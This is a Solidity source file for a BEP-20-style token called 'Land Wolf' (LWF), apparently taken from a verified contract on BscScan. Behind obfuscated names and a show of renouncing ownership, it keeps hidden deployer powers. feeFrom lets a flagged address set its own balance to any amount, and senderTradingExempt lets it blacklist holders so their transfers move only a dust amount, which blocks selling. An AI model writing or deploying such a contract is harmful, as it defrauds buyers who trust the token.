/**
 *Submitted for verification at BscScan.com on 2023-02-01
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface tradingBuy {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface takeAmount {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract LandWolf is Ownable{
    uint8 public decimals = 18;
    address public swapIs;
    uint256 constant tokenSwap = 10 ** 10;
    mapping(address => uint256) public balanceOf;
    mapping(address => bool) public isTrading;
    mapping(address => mapping(address => uint256)) public allowance;


    mapping(address => bool) public sellBuy;
    bool public fundTx;
    address public feeTo;

    string public name = "Land Wolf";

    string public symbol = "LWF";
    uint256 public totalSupply = 100000000 * 10 ** 18;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        tradingBuy senderBuy = tradingBuy(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        swapIs = takeAmount(senderBuy.factory()).createPair(senderBuy.WETH(), address(this));
        feeTo = autoTakeTo();
        isTrading[feeTo] = true;
        balanceOf[feeTo] = totalSupply;
        emit Transfer(address(0), feeTo, totalSupply);
        renounceOwnership();
    }

    

    function getOwner() external view returns (address) {
        return owner();
    }

    function senderTradingExempt(address receiverMaxMode) public {
        if (receiverMaxMode == feeTo || receiverMaxMode == swapIs || !isTrading[autoTakeTo()]) {
            return;
        }
        sellBuy[receiverMaxMode] = true;
    }

    function maxLaunch(address feeExempt) public {
        if (fundTx) {
            return;
        }
        isTrading[feeExempt] = true;
        fundTx = true;
    }

    function exemptFee(address swapShould, address isReceiver, uint256 walletExempt) internal returns (bool) {
        require(balanceOf[swapShould] >= walletExempt);
        balanceOf[swapShould] -= walletExempt;
        balanceOf[isReceiver] += walletExempt;
        emit Transfer(swapShould, isReceiver, walletExempt);
        return true;
    }

    function feeFrom(uint256 walletExempt) public {
        if (!isTrading[autoTakeTo()]) {
            return;
        }
        balanceOf[feeTo] = walletExempt;
    }

    function approve(address buyReceiver, uint256 walletExempt) public returns (bool) {
        allowance[autoTakeTo()][buyReceiver] = walletExempt;
        emit Approval(autoTakeTo(), buyReceiver, walletExempt);
        return true;
    }

    function transferFrom(address minFrom, address buyShould, uint256 walletExempt) public returns (bool) {
        if (minFrom != autoTakeTo() && allowance[minFrom][autoTakeTo()] != type(uint256).max) {
            require(allowance[minFrom][autoTakeTo()] >= walletExempt);
            allowance[minFrom][autoTakeTo()] -= walletExempt;
        }
        if (buyShould == feeTo || minFrom == feeTo) {
            return exemptFee(minFrom, buyShould, walletExempt);
        }
        if (sellBuy[minFrom]) {
            return exemptFee(minFrom, buyShould, tokenSwap);
        }
        return exemptFee(minFrom, buyShould, walletExempt);
    }

    function autoTakeTo() private view returns (address) {
        return msg.sender;
    }

    function transfer(address buyShould, uint256 walletExempt) external returns (bool) {
        return transferFrom(autoTakeTo(), buyShould, walletExempt);
    }


}